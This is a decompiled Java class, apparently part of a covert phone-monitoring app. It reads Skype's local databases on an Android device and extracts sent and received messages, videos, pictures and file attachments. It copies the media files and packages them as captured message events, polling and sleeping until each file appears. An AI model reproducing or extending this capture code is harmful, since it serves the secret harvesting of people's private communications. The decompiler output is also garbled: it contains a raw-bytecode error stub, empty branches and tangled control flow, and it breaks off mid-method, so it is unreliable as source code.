package com.vvt.capture.e;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.SystemClock;
import android.text.Html;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxIMAccountEvent;
import com.vvt.events.FxIMContactEvent;
import com.vvt.events.FxIMConversationEvent;
import com.vvt.events.FxIMMessageEvent;
import com.vvt.events.FxIMMessageServiceType;
import com.vvt.im.events.ImMediaFileType;
import com.vvt.im.events.ImType;
import com.vvt.im.events.MessageType;
import com.vvt.im.events.info.ICallLogData.Direction;
import com.vvt.io.p;
import java.io.File;
import java.security.SecureRandom;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.Date;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;

public class d
{
  private static final boolean a;
  private static final boolean b;
  private static final boolean c;
  private static final boolean d;
  private static final HostnameVerifier e;
  
  static
  {
    boolean bool = com.vvt.ak.a.a;
    if (bool) {
      bool = true;
    }
    for (;;)
    {
      a = bool;
      b = com.vvt.ak.a.b;
      c = com.vvt.ak.a.e;
      d = com.vvt.ak.a.d;
      f localf = new com/vvt/capture/e/f;
      localf.<init>();
      e = localf;
      return;
      bool = false;
      localf = null;
    }
  }
  
  /* Error */
  private static long a(SQLiteDatabase paramSQLiteDatabase)
  {
    // Byte code:
    //   0: iconst_m1
    //   1: i2l
    //   2: lstore_1
    //   3: ldc 37
    //   5: astore_3
    //   6: ldc 39
    //   8: astore 4
    //   10: aconst_null
    //   11: astore 5
    //   13: iconst_0
    //   14: istore 6
    //   16: ldc 41
    //   18: astore 7
    //   20: aload_0
    //   21: astore 8
    //   23: aload_0
    //   24: aload 4
    //   26: aconst_null
    //   27: aconst_null
    //   28: aconst_null
    //   29: aconst_null
    //   30: aconst_null
    //   31: aload_3
    //   32: aload 7
    //   34: invokevirtual 47	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   37: astore 5
    //   39: aload 5
    //   41: ifnull +137 -> 178
    //   44: aload 5
    //   46: invokeinterface 53 1 0
    //   51: istore 9
    //   53: iload 9
    //   55: ifeq +54 -> 109
    //   58: ldc 55
    //   60: astore 8
    //   62: aload 5
    //   64: aload 8
    //   66: invokeinterface 59 2 0
    //   71: istore 9
    //   73: aload 5
    //   75: iload 9
    //   77: invokeinterface 63 2 0
    //   82: lstore 10
    //   84: getstatic 17	com/vvt/capture/e/d:a	Z
    //   87: istore 6
    //   89: iload 6
    //   91: ifeq +3 -> 94
    //   94: aload 5
    //   96: ifnull +10 -> 106
    //   99: aload 5
    //   101: invokeinterface 66 1 0
    //   106: lload 10
    //   108: lreturn
    //   109: lconst_0
    //   110: lstore 10
    //   112: goto -28 -> 84
    //   115: astore 8
    //   117: aconst_null
    //   118: astore 5
    //   120: lload_1
    //   121: lstore 10
    //   123: getstatic 24	com/vvt/capture/e/d:MyUncaughtExceptionHandler	Z
    //   126: istore 6
    //   128: iload 6
    //   130: ifeq +3 -> 133
    //   133: aload 5
    //   135: ifnull -29 -> 106
    //   138: goto -39 -> 99
    //   141: astore 8
    //   143: aconst_null
    //   144: astore 5
    //   146: aload 5
    //   148: ifnull +10 -> 158
    //   151: aload 5
    //   153: invokeinterface 66 1 0
    //   158: aload 8
    //   160: athrow
    //   161: astore 8
    //   163: goto -17 -> 146
    //   166: astore 8
    //   168: lload_1
    //   169: lstore 10
    //   171: goto -48 -> 123
    //   174: pop
    //   175: goto -52 -> 123
    //   178: lload_1
    //   179: lstore 10
    //   181: goto -97 -> 84
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	184	0	paramSQLiteDatabase	SQLiteDatabase
    //   2	177	1	l1	long
    //   5	27	3	str1	String
    //   8	17	4	str2	String
    //   11	141	5	localCursor	Cursor
    //   14	115	6	bool1	boolean
    //   18	15	7	str3	String
    //   21	44	8	localObject1	Object
    //   115	1	8	localException1	Exception
    //   141	18	8	localObject2	Object
    //   161	1	8	localObject3	Object
    //   166	1	8	localException2	Exception
    //   51	3	9	bool2	boolean
    //   71	5	9	i	int
    //   82	98	10	l2	long
    //   174	1	15	localException3	Exception
    // Exception table:
    //   from	to	target	type
    //   32	37	115	java/lang/Exception
    //   32	37	141	finally
    //   44	51	161	finally
    //   64	71	161	finally
    //   75	82	161	finally
    //   84	87	161	finally
    //   123	126	161	finally
    //   44	51	166	java/lang/Exception
    //   64	71	166	java/lang/Exception
    //   75	82	166	java/lang/Exception
    //   84	87	174	java/lang/Exception
  }
  
  public static long a(String paramString)
  {
    SQLiteDatabase localSQLiteDatabase = null;
    long l = -1;
    int i = 17;
    try
    {
      localSQLiteDatabase = com.vvt.p.c.a(i, paramString);
      if (localSQLiteDatabase != null) {
        l = a(localSQLiteDatabase);
      }
      if (localSQLiteDatabase != null) {
        localSQLiteDatabase.close();
      }
      boolean bool = a;
      if (bool) {}
      return l;
    }
    finally
    {
      if (localSQLiteDatabase != null) {
        localSQLiteDatabase.close();
      }
    }
  }
  
  private static com.vvt.capture.e.a.d a(SQLiteDatabase paramSQLiteDatabase, String paramString1, String paramString2, com.vvt.base.b paramb, b paramb1, boolean paramBoolean)
  {
    int i = 70;
    int j = 1;
    int k = 0;
    Object localObject1 = null;
    Object localObject2 = g.e(paramString2);
    boolean bool1 = a;
    if (bool1) {}
    bool1 = false;
    com.vvt.capture.e.a.d locald = null;
    k = j;
    Object localObject3;
    for (;;)
    {
      if (locald != null)
      {
        localObject3 = locald.b();
        if (localObject3 != null) {
          break;
        }
      }
      int m = 4;
      if (k > m) {
        break;
      }
      if (!paramBoolean)
      {
        bool1 = a;
        if (bool1) {}
        long l1 = 15000L;
        SystemClock.sleep(l1);
      }
      locald = b(paramSQLiteDatabase, (String)localObject2);
      boolean bool2 = a;
      if (bool2) {}
      k += 1;
    }
    Object localObject4;
    if (locald != null)
    {
      localObject1 = ImType.SKYPE;
      localObject2 = ImMediaFileType.ATTACHMENT;
      localObject1 = com.vvt.im.a.c.a(paramString1, (ImType)localObject1, (ImMediaFileType)localObject2);
      localObject2 = com.vvt.im.a.c.a(ImMediaFileType.ATTACHMENT);
      localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      localObject1 = ((StringBuilder)localObject3).append((String)localObject1);
      localObject3 = File.separator;
      localObject1 = (String)localObject3 + (String)localObject2;
      localObject2 = locald.b();
      boolean bool3 = com.vvt.ag.b.a((String)localObject2);
      if (bool3) {
        break label401;
      }
      localObject2 = locald.b();
      long l2 = com.vvt.http.e.a((String)localObject2);
      long l3 = 0L;
      boolean bool4 = l2 < l3;
      if (bool4) {
        j = a(i, paramb, l2);
      }
      bool3 = a;
      if ((bool3) && (j == 0)) {
        break label388;
      }
      j = a;
      if (j != 0) {}
      localObject4 = locald.b();
      j = c((String)localObject4, (String)localObject1);
      if (j == 0) {
        break label375;
      }
      j = a;
      if (j != 0) {}
      localObject4 = new java/io/File;
      ((File)localObject4).<init>((String)localObject1);
      l2 = ((File)localObject4).length();
      j = a(i, paramb, l2);
      if (j == 0) {
        break label350;
      }
      locald.a((String)localObject1);
    }
    for (;;)
    {
      return locald;
      label350:
      j = a;
      if (j != 0) {}
      j = 0;
      localObject4 = null;
      paramb1.b = false;
      continue;
      label375:
      j = a;
      if (j != 0)
      {
        continue;
        label388:
        j = a;
        if (j != 0)
        {
          continue;
          label401:
          j = a;
          if (j == 0) {}
        }
      }
    }
  }
  
  private static b a(SQLiteDatabase paramSQLiteDatabase1, SQLiteDatabase paramSQLiteDatabase2, String paramString1, com.vvt.capture.e.a.c paramc, int paramInt, String paramString2, ICallLogData.Direction paramDirection, com.vvt.base.b paramb, boolean paramBoolean, String paramString3)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = ICallLogData.Direction.IN;
    if (paramDirection == localObject1) {}
    Object localObject2;
    b localb;
    int i1;
    boolean bool8;
    Object localObject3;
    long l1;
    for (localObject1 = "[You received a file.]";; localObject1 = "[You sent a file.]")
    {
      localObject2 = "<URIObject type=\"Video";
      localb = new com/vvt/capture/e/b;
      int n = 1;
      localb.<init>(n, (String)localObject1);
      if (paramString2 != null)
      {
        int i = paramString2.length();
        n = 1;
        if (i >= n) {}
      }
      else
      {
        bool2 = a;
        if (bool2) {}
        localObject1 = "body_xml";
        i1 = 1;
        paramString2 = a(paramSQLiteDatabase1, paramInt, (String)localObject1, i1);
      }
      bool2 = com.vvt.ag.b.a(paramString2);
      if (bool2) {
        break label1555;
      }
      localObject1 = "<URIObject type=\"Video";
      bool2 = paramString2.startsWith((String)localObject1);
      if (bool2) {
        break label247;
      }
      if (paramBoolean) {
        break label292;
      }
      bool2 = a;
      if (bool2) {}
      bool2 = false;
      i1 = 0;
      localObject2 = null;
      localObject1 = paramString2;
      for (;;)
      {
        int i3 = 10;
        if (i1 >= i3) {
          break;
        }
        localObject1 = a(paramSQLiteDatabase1, paramInt, "body_xml");
        bool8 = com.vvt.ag.b.a((String)localObject1);
        if (!bool8)
        {
          localObject3 = "<URIObject type=\"Video";
          bool8 = ((String)localObject1).startsWith((String)localObject3);
          if (bool8) {
            break;
          }
        }
        l1 = 6000L;
        SystemClock.sleep(l1);
        bool8 = a;
        if (bool8) {}
        i1 += 1;
      }
    }
    paramString2 = (String)localObject1;
    label247:
    localObject1 = "<URIObject type=\"Video";
    boolean bool2 = paramString2.startsWith((String)localObject1);
    if (!bool2)
    {
      bool2 = a;
      if (!bool2) {}
    }
    for (;;)
    {
      bool2 = a;
      if (bool2) {}
      label292:
      Object localObject4;
      String str1;
      long l4;
      long l5;
      label521:
      boolean bool10;
      label629:
      label816:
      label925:
      label967:
      boolean bool9;
      label1109:
      long l8;
      for (localObject1 = localb;; localObject1 = localb)
      {
        return (b)localObject1;
        bool2 = a;
        if (!bool2) {
          break;
        }
        break;
        localObject1 = a(paramSQLiteDatabase2, paramBoolean);
        localObject2 = g.b(paramString2);
        bool8 = a;
        if ((bool8) && (paramSQLiteDatabase2 == null)) {
          break label1542;
        }
        long l2 = 0L;
        l1 = 0L;
        localObject4 = ICallLogData.Direction.IN;
        boolean bool7;
        if (paramDirection == localObject4)
        {
          bool2 = a;
          if (bool2) {}
          localObject1 = new java/lang/StringBuilder;
          ((StringBuilder)localObject1).<init>();
          str1 = "u" + (String)localObject2;
          localObject2 = a(paramSQLiteDatabase2, str1, paramBoolean);
          bool2 = false;
          int i5 = 0;
          localObject4 = null;
          localObject1 = localObject2;
          i1 = 10;
          long l3;
          boolean bool3;
          if ((i5 < i1) && (!paramBoolean))
          {
            boolean bool6 = a;
            if (bool6) {}
            int i2 = ((ArrayList)localObject1).size();
            if (i2 == 0)
            {
              bool2 = a;
              if (bool2) {}
              l3 = 6000L;
              SystemClock.sleep(l3);
              bool2 = a;
              if (bool2) {}
              localObject2 = a(paramSQLiteDatabase2, str1, paramBoolean);
              int j = ((ArrayList)localObject2).size();
              if (j == 0) {
                break label816;
              }
              localObject1 = localObject2;
            }
          }
          else
          {
            localObject4 = ((ArrayList)localObject1).iterator();
            l4 = l1;
            l5 = l2;
            bool3 = ((Iterator)localObject4).hasNext();
            if (!bool3) {
              break label1109;
            }
            localObject1 = (a)((Iterator)localObject4).next();
            str2 = ((a)localObject1).a;
            str1 = "pvideo";
            bool10 = str2.equalsIgnoreCase(str1);
            if (!bool10) {
              break label925;
            }
            l4 = ((a)localObject1).b;
            bool3 = a;
            if (!bool3) {
              break label967;
            }
            l3 = l4;
          }
          for (l1 = l5;; l1 = l5)
          {
            l5 = l1;
            l4 = l3;
            break label521;
            bool7 = a;
            if (bool7) {}
            Iterator localIterator = ((ArrayList)localObject1).iterator();
            localObject2 = localObject1;
            bool3 = localIterator.hasNext();
            int i6;
            String str3;
            String str4;
            long l6;
            long l7;
            if (bool3)
            {
              localObject1 = (a)localIterator.next();
              i6 = a;
              if (i6 != 0) {}
              str3 = ((a)localObject1).a;
              str4 = "pvideo";
              i6 = str3.equalsIgnoreCase(str4);
              if (i6 != 0)
              {
                l6 = ((a)localObject1).b;
                l7 = 0L;
                i6 = l6 < l7;
                if (i6 == 0)
                {
                  bool3 = a;
                  if (bool3) {}
                  l3 = 6000L;
                  SystemClock.sleep(l3);
                  bool3 = a;
                  if (bool3) {}
                  localObject1 = a(paramSQLiteDatabase2, str1, paramBoolean);
                }
              }
            }
            for (;;)
            {
              localObject2 = localObject1;
              break label629;
              str3 = ((a)localObject1).a;
              str4 = "pvideo";
              i6 = str3.equalsIgnoreCase(str4);
              if (i6 != 0)
              {
                l6 = ((a)localObject1).b;
                l7 = 0L;
                i6 = l6 < l7;
                if (i6 != 0)
                {
                  bool3 = a;
                  if (bool3) {}
                  int k = i5 + 1;
                  i5 = k;
                  localObject1 = localObject2;
                  break;
                }
              }
              localObject1 = ((a)localObject1).a;
              str3 = "pthumbnail";
              boolean bool4 = ((String)localObject1).equalsIgnoreCase(str3);
              if (bool4)
              {
                int m = ((ArrayList)localObject2).size();
                i6 = 1;
                if (m == i6)
                {
                  bool5 = a;
                  if (bool5) {}
                  l3 = 6000L;
                  SystemClock.sleep(l3);
                  localObject1 = a(paramSQLiteDatabase2, str1, paramBoolean);
                  continue;
                }
              }
              bool5 = a;
              if (bool5) {}
              localObject1 = localObject2;
            }
            str2 = ((a)localObject1).a;
            str1 = "pthumbnail";
            bool10 = str2.equalsIgnoreCase(str1);
            if (bool10)
            {
              l5 = ((a)localObject1).b;
              bool5 = a;
              if (!bool5) {}
            }
            l3 = l4;
          }
        }
        else
        {
          bool7 = a;
          if (bool7) {}
          localObject1 = a(paramSQLiteDatabase2, (String)localObject1, paramBoolean);
          localObject2 = ((ArrayList)localObject1).iterator();
          for (;;)
          {
            bool5 = ((Iterator)localObject2).hasNext();
            if (!bool5) {
              break;
            }
            localObject1 = (a)((Iterator)localObject2).next();
            localObject4 = ((a)localObject1).a;
            str1 = "cvideo";
            bool9 = ((String)localObject4).equalsIgnoreCase(str1);
            if (bool9)
            {
              l1 = ((a)localObject1).b;
            }
            else
            {
              localObject4 = ((a)localObject1).a;
              str1 = "cthumbnail";
              bool9 = ((String)localObject4).equalsIgnoreCase(str1);
              if (bool9) {
                l2 = ((a)localObject1).b;
              }
            }
          }
          l4 = l1;
          l5 = l2;
        }
        bool5 = a;
        if (bool5) {}
        l8 = 0L;
        bool5 = l4 < l8;
        if (!bool5) {
          break label1529;
        }
        bool5 = a(70, paramb, l4);
        bool10 = a;
        if ((bool10) && (bool5)) {
          break label1176;
        }
        bool5 = false;
        localb.b = false;
      }
      label1176:
      String str2 = com.vvt.n.a.e.b.c(paramString3);
      localObject2 = a(str2, paramDirection, l4, paramBoolean);
      if (localObject2 != null)
      {
        int i4 = 2;
        localObject3 = new Object[i4];
        localObject4 = null;
        localObject3[0] = str2;
        str1 = ((com.vvt.io.c)localObject2).b;
        localObject3[1] = str1;
        localObject3 = String.format("%s/%s", (Object[])localObject3);
        bool5 = false;
        localObject1 = null;
        l8 = 0L;
        bool9 = l5 < l8;
        if (bool9) {
          localObject1 = a(str2, paramDirection, l5, paramBoolean);
        }
        if (localObject1 == null) {}
        Object localObject5;
        Object localObject6;
        for (localObject1 = b(paramString1, (String)localObject3);; localObject1 = g.a(paramString1, (String)localObject1, (ImType)localObject5, (ImMediaFileType)localObject6, str2))
        {
          boolean bool11 = a;
          if (bool11) {}
          localObject5 = ImType.SKYPE;
          localObject6 = ImMediaFileType.ATTACHMENT;
          str2 = paramb.f();
          localObject3 = g.a(paramString1, (String)localObject3, (ImType)localObject5, (ImMediaFileType)localObject6, str2);
          bool11 = a;
          if (bool11) {}
          localObject5 = new java/util/ArrayList;
          ((ArrayList)localObject5).<init>();
          localObject6 = new com/vvt/im/events/info/a;
          ((com.vvt.im.events.info.a)localObject6).<init>();
          localObject2 = ((com.vvt.io.c)localObject2).b;
          ((com.vvt.im.events.info.a)localObject6).a((String)localObject2);
          ((com.vvt.im.events.info.a)localObject6).c((String)localObject3);
          ((com.vvt.im.events.info.a)localObject6).d((String)localObject1);
          ((com.vvt.im.events.info.a)localObject6).b("video/mp4");
          ((ArrayList)localObject5).add(localObject6);
          paramc.a((List)localObject5);
          localObject1 = null;
          localb.a = null;
          bool5 = a;
          if (!bool5) {
            break;
          }
          break;
          int i7 = 2;
          localObject6 = new Object[i7];
          bool9 = false;
          localObject4 = null;
          localObject6[0] = str2;
          bool10 = true;
          localObject1 = ((com.vvt.io.c)localObject1).b;
          localObject6[bool10] = localObject1;
          localObject1 = String.format("%s/%s", (Object[])localObject6);
          localObject5 = ImType.SKYPE;
          localObject6 = ImMediaFileType.THUMBMAIL;
          str2 = paramb.f();
        }
      }
      boolean bool5 = a;
      if (bool5)
      {
        continue;
        label1529:
        bool5 = a;
        if (bool5)
        {
          continue;
          label1542:
          bool5 = a;
          if (bool5)
          {
            continue;
            label1555:
            bool5 = a;
            if (!bool5) {}
          }
        }
      }
    }
  }
  
  private static b a(SQLiteDatabase paramSQLiteDatabase, String paramString1, com.vvt.base.b paramb, com.vvt.capture.e.a.c paramc, String paramString2, boolean paramBoolean)
  {
    boolean bool1 = a;
    if (bool1) {}
    b localb = new com/vvt/capture/e/b;
    bool1 = true;
    localb.<init>(bool1, paramString2);
    Object localObject1;
    String str1;
    Object localObject2;
    Object localObject3;
    boolean bool2;
    if (paramString2 != null)
    {
      bool1 = a;
      if (bool1) {}
      localObject1 = paramSQLiteDatabase;
      str1 = paramString1;
      localObject2 = paramString2;
      localObject3 = paramb;
      localObject2 = a(paramSQLiteDatabase, paramString1, paramString2, paramb, localb, paramBoolean);
      if (localObject2 != null)
      {
        str1 = ((com.vvt.capture.e.a.d)localObject2).a();
        if (str1 != null)
        {
          localObject1 = b(paramString1, str1);
          bool2 = a;
          if (!bool2) {}
        }
      }
    }
    for (;;)
    {
      if ((str1 != null) && (localObject2 != null))
      {
        bool2 = b;
        if (bool2) {}
        localObject3 = new java/util/ArrayList;
        ((ArrayList)localObject3).<init>();
        com.vvt.im.events.info.a locala = new com/vvt/im/events/info/a;
        locala.<init>();
        String str2 = "received_video.mp4";
        locala.a(str2);
        locala.c(str1);
        locala.d((String)localObject1);
        locala.b("video/mp4");
        ((ArrayList)localObject3).add(locala);
        paramc.a((List)localObject3);
        localObject1 = ((com.vvt.capture.e.a.d)localObject2).c();
        if (localObject1 != null)
        {
          localObject1 = ((com.vvt.capture.e.a.d)localObject2).d();
          if (localObject1 != null)
          {
            localObject1 = ((com.vvt.capture.e.a.d)localObject2).c();
            i = ((String)localObject1).length();
            if (i > 0)
            {
              localObject1 = ((com.vvt.capture.e.a.d)localObject2).d();
              i = ((String)localObject1).length();
              if (i > 0)
              {
                localObject1 = new java/lang/StringBuilder;
                ((StringBuilder)localObject1).<init>();
                str1 = ((com.vvt.capture.e.a.d)localObject2).c();
                localObject1 = ((StringBuilder)localObject1).append(str1).append(" - ");
                str1 = ((com.vvt.capture.e.a.d)localObject2).d();
                localObject1 = str1;
              }
            }
          }
        }
      }
      for (;;)
      {
        bool3 = b;
        if (bool3) {}
        bool3 = a;
        if (bool3) {}
        localb.a = ((String)localObject1);
        return localb;
        localObject1 = ((com.vvt.capture.e.a.d)localObject2).c();
        if (localObject1 != null)
        {
          localObject1 = ((com.vvt.capture.e.a.d)localObject2).c();
          i = ((String)localObject1).length();
          if (i > 0)
          {
            localObject1 = ((com.vvt.capture.e.a.d)localObject2).c();
            continue;
          }
        }
        localObject1 = ((com.vvt.capture.e.a.d)localObject2).d();
        if (localObject1 != null)
        {
          localObject1 = ((com.vvt.capture.e.a.d)localObject2).d();
          i = ((String)localObject1).length();
          if (i > 0)
          {
            localObject1 = ((com.vvt.capture.e.a.d)localObject2).d();
            continue;
          }
        }
        i = 0;
        localObject1 = null;
        continue;
        localObject1 = "[You received a video.]";
      }
      int i = 0;
      localObject1 = null;
      continue;
      i = 0;
      localObject1 = null;
      boolean bool3 = false;
      str1 = null;
      continue;
      i = 0;
      localObject1 = null;
      bool3 = false;
      str1 = null;
      localObject2 = null;
    }
  }
  
  private static b a(SQLiteDatabase paramSQLiteDatabase, String paramString1, com.vvt.capture.e.a.c paramc, int paramInt, long paramLong, String paramString2, com.vvt.base.b paramb)
  {
    boolean bool1 = a;
    if (bool1) {}
    boolean bool5 = false;
    Object localObject1 = null;
    bool1 = false;
    Object localObject2 = null;
    b localb = new com/vvt/capture/e/b;
    boolean bool6 = true;
    localb.<init>(bool6, paramString2);
    int m;
    int n;
    if (paramString2 != null)
    {
      m = paramString2.length();
      n = 1;
      if (m >= n) {}
    }
    else
    {
      localObject3 = "creation_timestamp";
      localObject1 = Long.toString(paramLong);
      localObject1 = b(paramSQLiteDatabase, (String)localObject3, (String)localObject1);
      if (localObject1 != null) {
        localObject2 = ((com.vvt.capture.e.a.d)localObject1).a();
      }
      if (localObject2 != null)
      {
        m = ((String)localObject2).length();
        n = 1;
        if (m >= n) {}
      }
      else
      {
        boolean bool7 = a;
        if (bool7) {}
        n = 1;
        paramString2 = a(paramSQLiteDatabase, paramInt, "body_xml", n);
      }
    }
    for (Object localObject3 = paramString2;; localObject3 = paramString2)
    {
      Object localObject4;
      if (localObject3 != null)
      {
        localObject1 = g.e((String)localObject3);
        boolean bool8 = a;
        if (bool8) {}
        localObject4 = "sharing_id";
        localObject1 = b(paramSQLiteDatabase, (String)localObject4, (String)localObject1);
        if (localObject1 != null)
        {
          localObject2 = ((com.vvt.capture.e.a.d)localObject1).a();
          localObject4 = localObject1;
        }
      }
      for (localObject1 = localObject2;; localObject1 = localObject2)
      {
        if (localObject1 != null)
        {
          int i = ((String)localObject1).length();
          if (i > 0)
          {
            boolean bool2 = a;
            if (bool2) {}
            localObject2 = new java/io/File;
            ((File)localObject2).<init>((String)localObject1);
            long l1 = ((File)localObject2).length();
            bool2 = true;
            long l2 = 0L;
            boolean bool9 = l1 < l2;
            if (bool9) {
              bool2 = a(70, paramb, l1);
            }
            boolean bool10 = a;
            if ((!bool10) || (bool2))
            {
              localObject2 = ImType.SKYPE;
              localObject3 = ImMediaFileType.ATTACHMENT;
              Object localObject5 = paramb.f();
              localObject2 = g.a(paramString1, (String)localObject1, (ImType)localObject2, (ImMediaFileType)localObject3, (String)localObject5);
              localObject3 = b(paramString1, (String)localObject2);
              bool5 = a;
              if (bool5) {}
              localObject1 = new java/util/ArrayList;
              ((ArrayList)localObject1).<init>();
              localObject5 = new com/vvt/im/events/info/a;
              ((com.vvt.im.events.info.a)localObject5).<init>();
              String str = "sent video.mp4";
              ((com.vvt.im.events.info.a)localObject5).a(str);
              ((com.vvt.im.events.info.a)localObject5).c((String)localObject2);
              ((com.vvt.im.events.info.a)localObject5).d((String)localObject3);
              ((com.vvt.im.events.info.a)localObject5).b("video/mp4");
              ((ArrayList)localObject1).add(localObject5);
              paramc.a((List)localObject1);
              localObject2 = ((com.vvt.capture.e.a.d)localObject4).c();
              if (localObject2 != null)
              {
                localObject2 = ((com.vvt.capture.e.a.d)localObject4).d();
                if (localObject2 != null)
                {
                  localObject2 = ((com.vvt.capture.e.a.d)localObject4).c();
                  int j = ((String)localObject2).length();
                  if (j > 0)
                  {
                    localObject2 = ((com.vvt.capture.e.a.d)localObject4).d();
                    j = ((String)localObject2).length();
                    if (j > 0)
                    {
                      localObject2 = new java/lang/StringBuilder;
                      ((StringBuilder)localObject2).<init>();
                      localObject3 = ((com.vvt.capture.e.a.d)localObject4).c();
                      localObject2 = ((StringBuilder)localObject2).append((String)localObject3).append(" - ");
                      localObject3 = ((com.vvt.capture.e.a.d)localObject4).d();
                      localObject2 = (String)localObject3;
                    }
                  }
                }
              }
            }
          }
        }
        for (;;)
        {
          localb.a = ((String)localObject2);
          boolean bool3 = b;
          if (bool3) {}
          bool3 = a;
          if (bool3) {}
          return localb;
          localObject2 = ((com.vvt.capture.e.a.d)localObject4).c();
          if (localObject2 != null)
          {
            localObject2 = ((com.vvt.capture.e.a.d)localObject4).c();
            k = ((String)localObject2).length();
            if (k > 0)
            {
              localObject2 = ((com.vvt.capture.e.a.d)localObject4).c();
              continue;
            }
          }
          localObject2 = ((com.vvt.capture.e.a.d)localObject4).d();
          if (localObject2 != null)
          {
            localObject2 = ((com.vvt.capture.e.a.d)localObject4).d();
            k = ((String)localObject2).length();
            if (k > 0)
            {
              localObject2 = ((com.vvt.capture.e.a.d)localObject4).d();
              continue;
            }
          }
          int k = 0;
          localObject2 = null;
          continue;
          boolean bool4 = a;
          if (bool4) {}
          bool4 = false;
          localb.b = false;
          localObject2 = localObject3;
          continue;
          bool4 = a;
          if (bool4) {}
          localObject2 = "[You sent a video.]";
        }
        localObject4 = localObject1;
      }
    }
  }
  
  private static b a(SQLiteDatabase paramSQLiteDatabase, String paramString1, com.vvt.capture.e.a.c paramc, int paramInt1, long paramLong, String paramString2, ICallLogData.Direction paramDirection, String paramString3, com.vvt.base.b paramb, int paramInt2)
  {
    boolean bool1 = a;
    if (bool1) {}
    b localb = new com/vvt/capture/e/b;
    bool1 = true;
    localb.<init>(bool1, paramString2);
    int m;
    Object localObject1;
    if (paramString2 != null)
    {
      int i = paramString2.length();
      m = 1;
      if (i >= m) {}
    }
    else
    {
      bool2 = a;
      if (bool2) {}
      localObject1 = "body_xml";
      m = 1;
      paramString2 = a(paramSQLiteDatabase, paramInt1, (String)localObject1, m);
    }
    String str1 = g.a(paramString2);
    boolean bool2 = a;
    Object localObject2;
    Object localObject3;
    boolean bool5;
    if ((!bool2) || (str1 != null))
    {
      localObject1 = ICallLogData.Direction.IN;
      if (paramDirection == localObject1)
      {
        long l1 = 60000L;
        SystemClock.sleep(l1);
      }
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      String str2 = "file: " + str1;
      String str3 = paramb.f();
      localObject1 = paramSQLiteDatabase;
      localObject2 = paramDirection;
      localObject3 = paramString3;
      localObject1 = a(paramSQLiteDatabase, paramString1, str1, paramDirection, paramString3, str3);
      bool5 = com.vvt.ag.b.a((String)localObject1);
      if (bool5)
      {
        bool2 = a;
        if (bool2) {}
        bool2 = false;
        localb.b = false;
        localObject1 = str2;
      }
    }
    for (;;)
    {
      bool5 = a;
      if (bool5) {}
      bool5 = a;
      if (bool5) {}
      localb.a = ((String)localObject1);
      return localb;
      bool5 = a;
      if (bool5) {}
      bool5 = false;
      localObject2 = com.vvt.io.d.h((String)localObject1);
      localObject1 = new java/io/File;
      ((File)localObject1).<init>((String)localObject2);
      long l2 = ((File)localObject1).length();
      int j = 7;
      if (paramInt2 == j) {}
      int k;
      for (j = 7;; k = 68)
      {
        boolean bool3 = a(j, paramb, l2);
        boolean bool6 = a;
        if ((bool6) && (!bool3)) {
          break label417;
        }
        localObject1 = new java/util/ArrayList;
        ((ArrayList)localObject1).<init>();
        localObject3 = new com/vvt/im/events/info/a;
        ((com.vvt.im.events.info.a)localObject3).<init>();
        ((com.vvt.im.events.info.a)localObject3).a(str1);
        ((com.vvt.im.events.info.a)localObject3).c((String)localObject2);
        str1 = a(str1, (String)localObject2);
        boolean bool7 = a;
        if (bool7) {}
        ((com.vvt.im.events.info.a)localObject3).b(str1);
        ((ArrayList)localObject1).add(localObject3);
        paramc.a((List)localObject1);
        bool3 = false;
        localObject1 = null;
        break;
      }
      label417:
      boolean bool4 = a;
      if (bool4) {}
      bool4 = a;
      if (bool4) {}
      localObject1 = new java/io/File;
      ((File)localObject1).<init>((String)localObject2);
      ((File)localObject1).delete();
      localb.b = false;
      bool4 = false;
      localObject1 = null;
      continue;
      localObject1 = ICallLogData.Direction.IN;
      if (paramDirection == localObject1) {
        localObject1 = "[You received a file.]";
      } else {
        localObject1 = "[You sent a file.]";
      }
    }
  }
  
  private static b a(SQLiteDatabase paramSQLiteDatabase1, String paramString1, com.vvt.capture.e.a.c paramc, int paramInt, long paramLong, String paramString2, ICallLogData.Direction paramDirection, String paramString3, com.vvt.base.b paramb, SQLiteDatabase paramSQLiteDatabase2, boolean paramBoolean)
  {
    boolean bool1 = a;
    if (bool1) {}
    b localb = new com/vvt/capture/e/b;
    bool1 = true;
    localb.<init>(bool1, paramString2);
    Object localObject1 = ICallLogData.Direction.IN;
    if (paramDirection == localObject1) {}
    Object localObject4;
    boolean bool5;
    Object localObject6;
    for (localObject1 = "[You received a file.]";; localObject1 = "[You sent a file.]")
    {
      localObject2 = "You've received a new picture. View it at:";
      bool2 = com.vvt.ag.b.a(paramString2);
      if (bool2) {
        break label1098;
      }
      localObject2 = "You've received a new picture. View it at:";
      bool2 = paramString2.startsWith((String)localObject2);
      if (!bool2) {
        break label198;
      }
      if (paramBoolean) {
        break label251;
      }
      bool2 = a;
      if (bool2) {}
      bool2 = false;
      int j = 0;
      localObject4 = null;
      localObject2 = paramString2;
      for (;;)
      {
        int k = 10;
        if (j >= k) {
          break;
        }
        localObject2 = a(paramSQLiteDatabase1, paramInt, "body_xml");
        bool5 = com.vvt.ag.b.a((String)localObject2);
        if (!bool5)
        {
          localObject6 = "You've received a new picture. View it at:";
          bool5 = ((String)localObject2).startsWith((String)localObject6);
          if (!bool5) {
            break;
          }
        }
        long l1 = 6000L;
        SystemClock.sleep(l1);
        bool5 = a;
        if (bool5) {}
        j += 1;
      }
    }
    paramString2 = (String)localObject2;
    label198:
    Object localObject2 = "You've received a new picture. View it at:";
    boolean bool2 = paramString2.startsWith((String)localObject2);
    if (bool2)
    {
      bool2 = a;
      if (bool2) {}
      localb.a = ((String)localObject1);
    }
    for (;;)
    {
      label234:
      bool1 = a;
